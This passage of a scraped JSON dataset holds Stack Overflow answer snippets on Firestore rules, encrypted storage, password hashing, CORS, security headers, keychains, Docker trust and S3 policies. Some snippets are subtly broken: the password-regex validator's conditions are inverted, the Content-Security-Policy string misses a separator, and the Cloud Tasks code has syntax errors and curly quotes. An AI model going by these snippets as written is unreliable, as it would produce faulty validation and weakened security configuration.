        "body": "// Checks whether the two sets differ by only the given changes set\nfunction doesSetDifferBy(setA, setB, setChanges) {\n  return setA.difference(setB).union(setB.difference(setA)) == setChanges;\n}\n// Examples:\ndoesSetDifferBy(['a', 'b'].toSet(), ['a', 'c'].toSet(), ['b'].toSet()) == false // differs by ['b','c'].toSet() not ['b'].toSet()\ndoesSetDifferBy(['a', 'b'].toSet(), ['a'].toSet(), ['b'].toSet()) == true\ndoesSetDifferBy(['a', 'b'].toSet(), ['a', 'b'].toSet(), ['b'].toSet()) == false // sets are equal, not different\ndoesSetDifferBy(['a'].toSet(), ['a', 'b'].toSet(), ['b'].toSet()) == true",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2021-05-31T12:17:00",
        "author": "samthecodingman"
      },
      {
        "answer_id": 67777242,
        "body": "// Checks whether the two lists are both unique and differ by only the given changes list\nfunction doesUniqueListDifferBy(listA, listB, listChanges) {\n  return isListUnique(listA) && isListUnique(listB)\n    && doesSetDifferBy(listA.toSet(), listB.toSet(), listChanges.toSet())\n}\n// Examples:\ndoesUniqueListDifferBy(['a', 'b'], ['a', 'c'], ['b']) == false // differs by ['b','c'] not ['b']\ndoesUniqueListDifferBy(['a', 'b'], ['a'], ['b']) == true\ndoesUniqueListDifferBy(['a', 'b'], ['a', 'b'], ['b']) == false // lists are equal, not different\ndoesUniqueListDifferBy(['a'], ['a', 'b'], ['b']) == true\ndoesUniqueListDifferBy(['a', 'a'], ['a', 'b'], ['b']) == false // first list isn't unique",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2021-05-31T12:17:00",
        "author": "samthecodingman"
      },
      {
        "answer_id": 67777242,
        "body": "// Checks whether the two lists are both unique and either are\n// equal or differ by only the given changes list\nfunction isUniqueListUnchangedOrDiffersBy(listA, listB, listChanges) {\n  return isListUnique(listA) && isListUnique(listB)\n    && (listA.toSet() == listB.toSet()\n      || doesSetDifferBy(listA.toSet(), listB.toSet(), listChanges.toSet()))\n}\n// Examples:\nisUniqueListUnchangedOrDiffersBy(['a', 'b'], ['a', 'c'], ['b']) == false // differs by ['b','c'] not ['b']\nisUniqueListUnchangedOrDiffersBy(['a', 'b'], ['a', 'b'], ['b']) == true\nisUniqueListUnchangedOrDiffersBy(['a', 'b'], ['a'], ['b']) == true\nisUniqueListUnchangedOrDiffersBy(['a'], ['a', 'b'], ['b']) == true\nisUniqueListUnchangedOrDiffersBy(['a', 'a'], ['a', 'b'], ['b']) == false // first list isn't unique",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2021-05-31T12:17:00",
        "author": "samthecodingman"
      },
      {
        "answer_id": 67777242,
        "body": "rules_version = '2';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n\n    // Checks whether the given list is unique\n    function isListUnique(list) {\n      return list.toSet().size() == list.size();\n    }\n    // Checks whether the two sets differ by only the given changes set\n    function doesSetDifferBy(setA, setB, setChanges) {\n      return setA.difference(setB).union(setB.difference(setA)) == setChanges;\n    }\n\n    // Checks whether the two lists are both unique and either are\n    // equal or differ by only the given changes list\n    function isUniqueListUnchangedOrDiffersBy(listA, listB, listChanges) {\n      return isListUnique(listA) && isListUnique(listB)\n        && (listA.toSet() == listB.toSet()\n          || doesSetDifferBy(listA.toSet(), listB.toSet(), listChanges.toSet()))\n    }\n\n    match /requests/{requestID} {\n      allow update: if isUniqueListUnchangedOrDiffersBy(resource.data.likes, request.resource.data.likes, [request.auth.uid]);\n    }\n  }\n}",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2021-05-31T12:17:00",
        "author": "samthecodingman"
      },
      {
        "answer_id": 67777242,
        "body": "rules_version = '2';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n\n    // Checks whether the given list is unique\n    function isListUnique(list) {\n      return list.toSet().size() == list.size();\n    }\n    // Checks whether the two sets differ by only the given changes set\n    function doesSetDifferBy(setA, setB, setChanges) {\n      return setA.difference(setB).union(setB.difference(setA)) == setChanges;\n    }\n\n    // Checks whether the two lists are both unique and either are\n    // equal or differ by only the given changes list\n    function isUniqueListUnchangedOrDiffersBy(listA, listB, listChanges) {\n      return isListUnique(listA) && isListUnique(listB)\n        && (listA.toSet() == listB.toSet()\n          || doesSetDifferBy(listA.toSet(), listB.toSet(), listChanges.toSet()))\n    }\n    // Checks whether the property contains a unique list that was either\n    // unchanged or differs by only the given changes list\n    function isUniqueListDataPropUnchangedOrDiffersBy(propName, listChanges) {\n      return isUniqueListUnchangedOrDiffersBy(resource.data[propName], request.resource.data[propName], listChanges)\n    }\n\n    match /requests/{requestID} {\n      allow update: if isUniqueListDataPropUnchangedOrDiffersBy(\"likes\", [request.auth.uid]);\n    }\n  }\n}",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2021-05-31T12:17:00",
        "author": "samthecodingman"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/62211772/store-client-certificate-and-key-pem-in-android-securely",
    "title": "Store Client Certificate and key (.pem) in Android securely",
    "question_id": 62211772,
    "posted_date": "2020-06-05T05:05:07",
    "answers": [
      {
        "answer_id": 62821387,
        "body": "// Although you can define your own key generation parameter specification, it's\n// recommended that you use the value specified here.\nval keyGenParameterSpec = MasterKeys.AES256_GCM_SPEC\nval masterKeyAlias = MasterKeys.getOrCreate(keyGenParameterSpec)\n// Creates a file with this name, or replaces an existing file\n// that has the same name. Note that the file name cannot contain\n// path separators.\nval fileToWrite = \"my_sensitive_data.txt\"\nval encryptedFile = EncryptedFile.Builder(\n    File(DIRECTORY, fileToWrite),\n    context,\n    masterKeyAlias,\n    EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB\n).build()\nval fileContent = \"MY SUPER-SECRET INFORMATION\"\n        .toByteArray(StandardCharsets.UTF_8))\nencryptedFile.openFileOutput().apply {\n    write(fileContent)\n    flush()\n    close()\n}",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2020-07-09T14:29:02",
        "author": "Exadra37"
      },
      {
        "answer_id": 62821387,
        "body": "// Although you can define your own key generation parameter specification, it's\n// recommended that you use the value specified here.\nval keyGenParameterSpec = MasterKeys.AES256_GCM_SPEC\nval masterKeyAlias = MasterKeys.getOrCreate(keyGenParameterSpec)\nval context = applicationContext\nval fileToRead = \"my_sensitive_data.txt\"\nval encryptedFile = EncryptedFile.Builder(\n    File(DIRECTORY, fileToRead),\n    context,\n    masterKeyAlias,\n    EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB\n).build()\nval inputStream = encryptedFile.openFileInput()\nval byteArrayOutputStream = ByteArrayOutputStream()\nvar nextByte: Int = inputStream.read()\nwhile (nextByte != -1) {\n    byteArrayOutputStream.write(nextByte)\n    nextByte = inputStream.read()\n}\nval plaintext: ByteArray = byteArrayOutputStream.toByteArray()",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2020-07-09T14:29:02",
        "author": "Exadra37"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/61573031/protecting-stack-memory-of-program",
    "title": "protecting stack memory of program",
    "question_id": 61573031,
    "posted_date": "2020-05-03T06:34:45",
    "answers": [
      {
        "answer_id": 61573156,
        "body": "(gdb) disas 0x0000555555554610,0x0000555555554700\nDump of assembler code from 0x555555554610 to 0x555555554700:\n   0x0000555555554610:\txor    %edi,%edi\n   0x0000555555554612:\tsub    $0x8,%rsp\n   0x0000555555554616:\tcallq  0x5555555545e0 <time@plt>\n   0x000055555555461b:\tmov    %eax,%edi\n   0x000055555555461d:\tcallq  0x5555555545d0 <srand@plt>\n   0x0000555555554622:\tnopl   0x0(%rax)\n   0x0000555555554626:\tnopw   %cs:0x0(%rax,%rax,1)\n   0x0000555555554630:\tcallq  0x5555555545f0 <rand@plt>\n   0x0000555555554635:\tcmp    $0x62c,%eax\n   0x000055555555463a:\tjne    0x555555554630\n   0x000055555555463c:\tlea    0x17a(%rip),%rdi        # 0x5555555547bd\n   0x0000555555554643:\tcallq  0x5555555545c0 <puts@plt>\n   0x0000555555554648:\txor    %eax,%eax\n   0x000055555555464a:\tadd    $0x8,%rsp\n   0x000055555555464e:\tretq\n   ...",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2020-05-03T06:45:21",
        "author": "Erlkoenig"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/56558355/fetch-data-from-one-table-columns-whose-names-are-value-of-another-table",
    "title": "Fetch data from one table columns whose names are value of another table",
    "question_id": 56558355,
    "posted_date": "2019-06-12T05:01:16",
    "answers": [
      {
        "answer_id": 56558872,
        "body": "CREATE TABLE metadata ( org_id, Username, short_desc ) AS\nSELECT 1, 'aa', 'Industry'    FROM DUAL UNION ALL\nSELECT 1, 'rk', 'sector'      FROM DUAL UNION ALL\nSELECT 1, 'rk', 'Industry'    FROM DUAL UNION ALL\nSELECT 1, 'pa', 'sector'      FROM DUAL UNION ALL\nSELECT 1, 'pa', 'Industry'    FROM DUAL UNION ALL\nSELECT 1, 'pa', 'Subindustry' FROM DUAL;\nCREATE TABLE master ( org_id, ID, sector, Industry, Subindustry ) AS\nSELECT 1, '594918104', 'Technology',         'Information Technology', 'CyberSecurity' FROM DUAL UNION ALL\nSELECT 1, 'G0464B107', 'Financial Services', 'Financials',             'Banks'         FROM DUAL",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2019-06-12T05:29:01",
        "author": "MT0"
      },
      {
        "answer_id": 56558872,
        "body": "SELECT md.username,\n       m.id,\n       NVL2( md.sector,      m.sector,      NULL ) AS sector,\n       NVL2( md.industry,    m.industry,    NULL ) AS industry,\n       NVL2( md.subindustry, m.subindustry, NULL ) AS subindustry\nFROM   ( SELECT *\n         FROM   metadata\n         PIVOT ( MAX(1) FOR short_desc IN (\n           'sector'      AS sector,\n           'Industry'    AS industry,\n           'Subindustry' AS subindustry\n         ) ) ) md\n       INNER JOIN master m\n       ON ( md.org_id = m.org_id )\nWHERE  md.org_id = 1",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2019-06-12T05:29:01",
        "author": "MT0"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/22581982/which-type-specific-access-rights-access-mask-are-valid-for-se-lmshare",
    "title": "Which type specific access rights (ACCESS_MASK) are valid for SE_LMSHARE?",
    "question_id": 22581982,
    "posted_date": "2014-03-22T14:50:22",
    "answers": [
      {
        "answer_id": 47530193,
        "body": "`c\n[Flags]\npublic enum ACCESS_MASK : uint\n{\n    READ_FILE =         0x000001, // 0b000000000000000000001, 1 << 0\n    WRITE_FILE =        0x000002, // 0b000000000000000000010, 1 << 1\n    CREATE_SUBDIR =     0x000004, // 0b000000000000000000100, 1 << 2\n    READ_EXT_ATTR =     0x000008, // 0b000000000000000001000, 1 << 3\n    WRITE_EXT_ATTR =    0x000010, // 0b000000000000000010000, 1 << 4\n    EXECUTE =           0x000020, // 0b000000000000000100000, 1 << 5\n    DELETE_DIR =        0x000040, // 0b000000000000001000000, 1 << 6\n    READ_FILE_ATTR =    0x000080, // 0b000000000000010000000, 1 << 7\n    WRITE_FILE_ATTR =   0x000100, // 0b000000000000100000000, 1 << 8\n    DELETE =            0x010000, // 0b000010000000000000000, 1 << 16\n    READ_SD =           0x020000, // 0b000100000000000000000, 1 << 17\n    WRITE_DACL =        0x040000, // 0b001000000000000000000, 1 << 18\n    WRITE_OWNER =       0x080000, // 0b010000000000000000000, 1 << 19\n    SYNCHRONIZE =       0x100000, // 0b100000000000000000000, 1 << 20\n                                  //   2         1\n                                  //   098765432109876543210\n\n    // These combinations of the above flags correspond to the preset control levels in the relevant Windows dialogs.\n    SHARE_READ =    READ_FILE | READ_EXT_ATTR | EXECUTE | READ_FILE_ATTR | READ_SD | SYNCHRONIZE,\n    SHARE_CHANGE =  SHARE_READ | WRITE_FILE | CREATE_SUBDIR | WRITE_EXT_ATTR | WRITE_FILE_ATTR | DELETE,\n    SHARE_FULL =    SHARE_CHANGE | DELETE_DIR | WRITE_DACL | WRITE_OWNER\n}",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2017-11-28T06:14:35",
        "author": "nick_b"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79507521/psalm-does-not-detect-sql-injection",
    "title": "Psalm does not detect SQL Injection",
    "question_id": 79507521,
    "posted_date": "2025-03-13T16:10:05",
    "answers": [
      {
        "answer_id": 79507639,
        "body": "<?xml version=\"1.0\"?>\n<!-- Add runTaintAnalysis -->\n<psalm\n    errorLevel=\"1\"\n    resolveFromConfigFile=\"true\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns=\"https://getpsalm.org/schema/config\"\n    xsi:schemaLocation=\"https://getpsalm.org/schema/config vendor/vimeo/psalm/config.xsd\"\n    findUnusedBaselineEntry=\"true\"\n    findUnusedCode=\"true\"\n    runTaintAnalysis=\"true\"\n>\n    <projectFiles>\n        <directory name=\"src\" />\n        <ignoreFiles>\n            <directory name=\"vendor\" />\n        </ignoreFiles>\n    </projectFiles>\n    <!-- Important -->\n    <enableExtensions>\n        <extension name=\"pdo\" />\n    </enableExtensions>\n</psalm>",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2025-03-13T17:10:14",
        "author": "Arthur Eudeline"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76476456/google-cloud-tasks-how-to-secure-http-post-request",
    "title": "Google Cloud Tasks - How to secure HTTP POST request?",
    "question_id": 76476456,
    "posted_date": "2023-06-14T14:13:54",
    "answers": [
      {
        "answer_id": 76476457,
        "body": "const task {\n    name: `${taskName}/myTask-${snapshot.id}-${expireSeconds}`,\n      httpRequest: {\n    httpMethod: \u2018POST\u2019,\n    url: `https://${location}-${project}.cloudfunctions.net/schedulerCallback?eventId=${snapshot.id}`,\n    body: Buffer.from(JSON.stringify(payload)).toString(\u2018base64\u2019),\n       headers: { \u2018Content-Type\u2019: \u2018application/json\u2019 }\n    }\n   oidcToken: {\n     serviceAccountEmail,\n     audience: \u201chttps://${location}-${project}.cloudfunctions.net/schedulerCallback\u201d\n   }\n     scheduleTime: {\n     seconds: expirationAtSeconds\n  }\n}",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2023-06-14T14:13:54",
        "author": "Muhammad Adnan"
      },
      {
        "answer_id": 76476457,
        "body": "export const schedulerCallback = functions.https.onRequest(async (req, res) => {\n   // add the projectID and location\n   const project = json.parse(process.env.FIREBASE_CONFIG!).projectId;\n   const location = \u2018us-central1\u2019;\n   const eventId = req.query.eventId as string;\n   // access the headers > authorization of the request\n    const authorizationHeader = req.headers.authorization;\n  // check if authorization header is not null\n   if(!authorizationHeader) {\n      res.status(401).send(\u201cunauthorized token\u201d);\n      return;\n   }\n   // if authorizationHeader is not null access the token\n    const token = authorizationHeader.split(\u2018 \u2019)[1];\n   // verify ID token\n    try {\n      await verifyToken(token, location, project); // calling the above defined function\n    } catch (error) {\n      console.log(error);\n      res.status(401).send(\u201cUnauthorized token\u201d);\n      return;\n    }\n   // delete document\n   try {\n      await admin.firestore().collection(\u201cevents\u201d).doc(eventId).delete();\n   } catch(e) {\n      console.log(e);\n      res.status(500).send(e);\n   }\n});",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2023-06-14T14:13:54",
        "author": "Muhammad Adnan"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69128848/keychain-api-is-looking-only-into-system-keychain-not-in-login-keychain-mac-os-s",
    "title": "Keychain API is looking only into system keychain not in login keychain Mac OS Swift",
    "question_id": 69128848,
    "posted_date": "2021-09-10T03:43:42",
    "answers": [
      {
        "answer_id": 69143179,
        "body": "import Foundation\nimport Security\nvar result: OSStatus\n// Usually, we operate in the \"user\" domain, check this:\nvar domain: SecPreferencesDomain = .system\nresult = SecKeychainGetPreferenceDomain(&domain)\nif result == errSecSuccess {\n    assert(domain == .user)\n}\n// Get the list of searched keychains of the current domain:\n// (it should include the \"default\" keychain for the \"user\" domain)\nvar searchList: CFArray? = nil\nresult = SecKeychainCopyDomainSearchList(domain, &searchList)\nguard result == errSecSuccess, let searchedKeyChains = searchList as? [SecKeychain] else {\n    fatalError(\"SecKeychainCopyDomainSearchList failed\")\n}\nprint(\"Keychain search list:\")\nsearchedKeyChains.forEach { keyChain in\n    print(keyChain)\n}\nprint(\"\")\n// Get the default keychain for the current domain:\nvar defaultKeyChain: SecKeychain? = nil\nresult = SecKeychainCopyDefault(&defaultKeyChain)\nguard result == errSecSuccess, defaultKeyChain != nil else {\n    fatalError(\"SecKeychainCopyDefault failed\")\n}\nprint(\"Default Keychain: \\(defaultKeyChain!)\")",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2021-09-11T08:47:57",
        "author": "CouchDeveloper"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66871184/how-does-this-protect-against-csrf-attacks",
    "title": "how does this protect against csrf attacks?",
    "question_id": 66871184,
    "posted_date": "2021-03-30T08:41:48",
    "answers": [
      {
        "answer_id": 66871371,
        "body": "if(in_array($this->request->server['HTTP_ORIGIN'], [\n    'http://xxx-domain.org',\n    'https://example.org',\n    'http://localhost:8888',\n])) {\n    $this->response->addHeader(\"Access-Control-Allow-Origin: {$this->request->server['HTTP_ORIGIN']}\");\n    $this->response->addHeader('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');\n    $this->response->addHeader('Access-Control-Max-Age: 1000');\n    $this->response->addHeader('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2021-03-30T08:56:26",
        "author": "Markus Zeller"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66786302/regex-password-validation-not-working-javascript",
    "title": "Regex password validation not working - javascript",
    "question_id": 66786302,
    "posted_date": "2021-03-24T13:31:19",
    "answers": [
      {
        "answer_id": 66790268,
        "body": "    // Check if password contains at least 1 letter\n    if(/[a-z]/i.test(password)){\n        errors.push({ msg: 'Password should contain at least one letter' });\n    }\n    // Check if password contains at least 1 Uppercase letter\n    if(/[A-Z]/.test(password)){\n        errors.push({ msg: 'Password should contain at least one uppercase character' });\n    }\n    // Check if password contains at least 1 number\n    if(/[0-9]/.test(password)){\n        errors.push({ msg: 'Password should contain at least one number' });\n    }",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2021-03-24T18:22:37",
        "author": "Ryszard Czech"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66385360/what-is-set-psrepository-scope-effect",
    "title": "What is Set-PSRepository scope effect?",
    "question_id": 66385360,
    "posted_date": "2021-02-26T06:51:48",
    "answers": [
      {
        "answer_id": 66388417,
        "body": "PS C:\\Users\\TestUser01> Get-CimInstance -Query 'SELECT Caption,Version FROM Win32_OperatingSystem' | select Caption,Version\nCaption                              Version\n-------                              -------\nMicrosoft Windows 10 Enterprise LTSC 10.0.17763\nPS C:\\Users\\TestUser01> $PSVersionTable.PSVersion.ToString()\n5.1.17763.1490\nPS C:\\Users\\TestUser01> $null -eq (gcm pwsh -ea:ig)\nTrue\nPS C:\\Users\\TestUser01> Get-PSRepository\nName                      InstallationPolicy   SourceLocation\n----                      ------------------   --------------\nPSGallery                 Untrusted            https://www.powershellgallery.com/api/v2\nPS C:\\Users\\TestUser01> Set-PSRepository PSGallery -in Trusted\nPS C:\\Users\\TestUser01> Register-PSRepository ExampleRepo -so 'http://example.com'\nPS C:\\Users\\TestUser01> Get-PSRepository\nName                      InstallationPolicy   SourceLocation\n----                      ------------------   --------------\nPSGallery                 Trusted              https://www.powershellgallery.com/api/v2\nExampleRepo               Untrusted            http://example.com/",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2021-02-26T10:22:10",
        "author": "TheFreeman193"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65980301/how-to-verify-compare-equal-bcrypt-hashed-password-with-a-given-password-in",
    "title": "How to verify / compare / equal BCrypt hashed Password with a given Password in Quarkus / Wildfly",
    "question_id": 65980301,
    "posted_date": "2021-01-31T09:32:16",
    "answers": [
      {
        "answer_id": 65980302,
        "body": "import org.wildfly.security.password.Password;\nimport org.wildfly.security.password.PasswordFactory;\nimport org.wildfly.security.password.WildFlyElytronPasswordProvider;\nimport org.wildfly.security.password.interfaces.BCryptPassword;\nimport org.wildfly.security.password.util.ModularCrypt;\nimport io.quarkus.elytron.security.common.BcryptUtil;\npublic class SecurityUtil {\n    public static void main(String[] args) throws Exception {\n        String bCryptPasswordHash = BcryptUtil.bcryptHash(\"Password_1\");\n        String passwordToVerify = \"Password_1\";\n        System.out.println(verifyBCryptPassword(bCryptPasswordHash, passwordToVerify)); // -> true\n        System.out.println(verifyBCryptPassword(bCryptPasswordHash, \"NotPassword_1\")); // --> false\n    }\n    public static boolean verifyBCryptPassword(String bCryptPasswordHash, String passwordToVerify) throws Exception {\n        WildFlyElytronPasswordProvider provider = new WildFlyElytronPasswordProvider();\n        // 1. Create a BCrypt Password Factory\n        PasswordFactory passwordFactory = PasswordFactory.getInstance(BCryptPassword.ALGORITHM_BCRYPT, provider);\n        // 2. Decode the hashed user password\n        Password userPasswordDecoded = ModularCrypt.decode(bCryptPasswordHash);\n        // 3. Translate the decoded user password object to one which is consumable by this factory.\n        Password userPasswordRestored = passwordFactory.translate(userPasswordDecoded);\n        // Verify existing user password you want to verify\n        return passwordFactory.verify(userPasswordRestored, passwordToVerify.toCharArray());\n    }\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2021-01-31T09:32:16",
        "author": "Andreas Hauschild"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65581202/how-to-secure-rails-api-requests",
    "title": "How to secure Rails API requests?",
    "question_id": 65581202,
    "posted_date": "2021-01-05T09:52:00",
    "answers": [
      {
        "answer_id": 65581993,
        "body": "before_action :set_headers\n  def set_headers\n    response.set_header('Referrer-Policy', 'strict-origin-when-cross-origin')\n    response.set_header('X-Content-Type-Options', 'nosniff')\n    response.set_header('X-Frame-Options', 'SAMEORIGIN')\n    response.set_header('X-XSS-Protection', '1; mode=block')\n    response.set_header('Content-Security-Policy', \"default-src 'self' https:; \" \\\n        \"img-src 'self' https:\" \\\n        \"media-src 'none'; \" \\\n        \"object-src 'none'; \" \\\n        \"script-src 'self'; \" \\\n        \"style-src 'self' \")\n  end",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-01-05T10:42:25",
        "author": "r4cc00n"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63960217/how-to-list-all-of-the-known-root-keys-in-docker-docker-content-trust",
    "title": "How to list all of the known root keys in docker (Docker Content Trust)",
    "question_id": 63960217,
    "posted_date": "2020-09-18T13:20:56",
    "answers": [
      {
        "answer_id": 64103579,
        "body": "root@disp9131:~# export DOCKER_CONTENT_TRUST=1\nroot@disp9131:~#\nroot@disp9131:~# docker pull debian:stable-slim\nPull (1 of 1): debian:stable-slim@sha256:89ff9e144a438f6bdf89fba6a1fdcb614b6d03bc14433bbb937088ca7c7a7b6d\nsha256:89ff9e144a438f6bdf89fba6a1fdcb614b6d03bc14433bbb937088ca7c7a7b6d: Pulling from library/debian\n696098ac4087: Pull complete\nDigest: sha256:89ff9e144a438f6bdf89fba6a1fdcb614b6d03bc14433bbb937088ca7c7a7b6d\nStatus: Downloaded newer image for debian@sha256:89ff9e144a438f6bdf89fba6a1fdcb614b6d03bc14433bbb937088ca7c7a7b6d\nTagging debian@sha256:89ff9e144a438f6bdf89fba6a1fdcb614b6d03bc14433bbb937088ca7c7a7b6d as debian:stable-slim\nroot@disp9131:~#\nroot@disp9131:~# ls $HOME/.docker/trust/tuf/docker.io/library\ndebian\nroot@disp9131:~#\nroot@disp9131:~# docker pull ubuntu:latest\nPull (1 of 1): ubuntu:latest@sha256:bc2f7250f69267c9c6b66d7b6a81a54d3878bb85f1ebb5f951c896d13e6ba537\nsha256:bc2f7250f69267c9c6b66d7b6a81a54d3878bb85f1ebb5f951c896d13e6ba537: Pulling from library/ubuntu\nd72e567cc804: Pull complete\n0f3630e5ff08: Pull complete\nb6a83d81d1f4: Pull complete\nDigest: sha256:bc2f7250f69267c9c6b66d7b6a81a54d3878bb85f1ebb5f951c896d13e6ba537\nStatus: Downloaded newer image for ubuntu@sha256:bc2f7250f69267c9c6b66d7b6a81a54d3878bb85f1ebb5f951c896d13e6ba537\nTagging ubuntu@sha256:bc2f7250f69267c9c6b66d7b6a81a54d3878bb85f1ebb5f951c896d13e6ba537 as ubuntu:latest\nroot@disp9131:~#\nroot@disp9131:~# ls $HOME/.docker/trust/tuf/docker.io/library\ndebian\tubuntu\nroot@disp9131:~#",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2020-09-28T09:52:38",
        "author": "Michael Altfield"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60910170/how-do-i-compare-salt-with-a-generated-password",
    "title": "How do I compare salt with a generated password?",
    "question_id": 60910170,
    "posted_date": "2020-03-29T00:26:53",
    "answers": [
      {
        "answer_id": 60910190,
        "body": "private static void savePassword(String rawPassword) throws InvalidKeySpecException, NoSuchAlgorithmException {\n    byte[] salt = getSalt();\n    String hashedPassword = getHashedPassword(rawPassword, salt);\n    String encodedSalt = base64Encode(salt);\n    /* todo: store hashPassword and encodedSalt */\n}\nprivate static boolean verifyPassword(String rawPassword, String hashedPassword, String encodedSalt) throws InvalidKeySpecException, NoSuchAlgorithmException {\n    return Objects.equals(hashedPassword, getHashedPassword(rawPassword, base64Decode(encodedSalt)));\n}\nprivate static String getHashedPassword(String rawPassword, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException {\n    KeySpec spec = new PBEKeySpec(rawPassword.toCharArray(), salt, 65536, 128);\n    SecretKeyFactory factory = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\");\n    byte[] hash = factory.generateSecret(spec).getEncoded();\n    return base64Encode(hash);\n}\nprivate static byte[] getSalt() {\n    Random r = new SecureRandom();\n    byte[] saltBytes = new byte[32];\n    r.nextBytes(saltBytes);\n    return saltBytes;\n}\nprivate static String base64Encode(byte[] src) {\n    return Base64.getEncoder().encodeToString(src);\n}\nprivate static byte[] base64Decode(String src) {\n    return Base64.getDecoder().decode(src);\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2020-03-29T00:31:50",
        "author": "Mohsen Zamani"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60338384/create-new-x509-certificate-in-swift-on-ios-device",
    "title": "Create new X509 certificate in swift on iOS device",
    "question_id": 60338384,
    "posted_date": "2020-02-21T07:08:59",
    "answers": [
      {
        "answer_id": 60417364,
        "body": "func obtainKeyData(_ tag: String) -> Data {\n      var keyRef: AnyObject?\n      let query: Dictionary<String, AnyObject> = [\n          String(kSecAttrKeyType): kSecAttrKeyTypeRSA,\n          String(kSecReturnData): kCFBooleanTrue as CFBoolean,\n          String(kSecClass): kSecClassKey as CFString,\n          String(kSecAttrApplicationTag): tag as CFString,\n      ]\n\n      switch SecItemCopyMatching(query as CFDictionary, &keyRef) {\n      case noErr:\n        return keyRef as! Data\n      default:\n        fatalError(\"Error\")\n      }\n  }",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2020-02-26T10:32:45",
        "author": "Andy Ibanez"
      },
      {
        "answer_id": 60417364,
        "body": "extension Data {\n  public func dataByPrependingX509Header() -> Data {\n      let result = NSMutableData()\n\n      let encodingLength: Int = (self.count + 1).encodedOctets().count\n      let OID: [CUnsignedChar] = [0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86,\n          0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00]\n\n      var builder: [CUnsignedChar] = []\n\n      // ASN.1 SEQUENCE\n      builder.append(0x30)\n\n      // Overall size, made of OID + bitstring encoding + actual key\n      let size = OID.count + 2 + encodingLength + self.count\n      let encodedSize = size.encodedOctets()\n      builder.append(contentsOf: encodedSize)\n      result.append(builder, length: builder.count)\n      result.append(OID, length: OID.count)\n      builder.removeAll(keepingCapacity: false)\n\n      builder.append(0x03)\n      builder.append(contentsOf: (self.count + 1).encodedOctets())\n      builder.append(0x00)\n      result.append(builder, length: builder.count)\n\n      // Actual key bytes\n      result.append(self)\n\n      return result as Data\n  }\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2020-02-26T10:32:45",
        "author": "Andy Ibanez"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/59799415/can-you-use-tags-to-give-access-to-s3-buckets",
    "title": "Can you use tags to give access to S3 Buckets?",
    "question_id": 59799415,
    "posted_date": "2020-01-18T05:02:53",
    "answers": [
      {
        "answer_id": 59806844,
        "body": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"DenyObjectOthers\",\n      \"Effect\": \"Deny\",\n      \"Principal\": \"*\",\n      \"Action\": [\n        \"s3:AbortMultipartUpload\",\n        \"s3:ListMultipartUploadParts\",\n        \"s3:DeleteObject*\",\n        \"s3:PutObject*\",\n        \"s3:GetObject*\",\n        \"s3:RestoreObject*\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::BUCKET_NAME/*\"\n      ],\n      \"Condition\": {\n        \"StringNotLike\": {\n          \"aws:PrincipalTag/department\": [\n            \"hr\"\n          ]\n        }\n      }\n    },\n    {\n      \"Sid\": \"DenyListOthers\",\n      \"Effect\": \"Deny\",\n      \"Principal\": \"*\",\n      \"Action\": [\n        \"s3:ListBucket*\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::BUCKET_NAME\"\n      ],\n      \"Condition\": {\n        \"StringNotLike\": {\n          \"aws:PrincipalTag/department\": [\n            \"hr\"\n          ]\n        }\n      }\n    },\n    {\n      \"Sid\": \"AllowObject\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::AWS_ACCOUNT_NUMBER:root\"\n      },\n      \"Action\": [\n        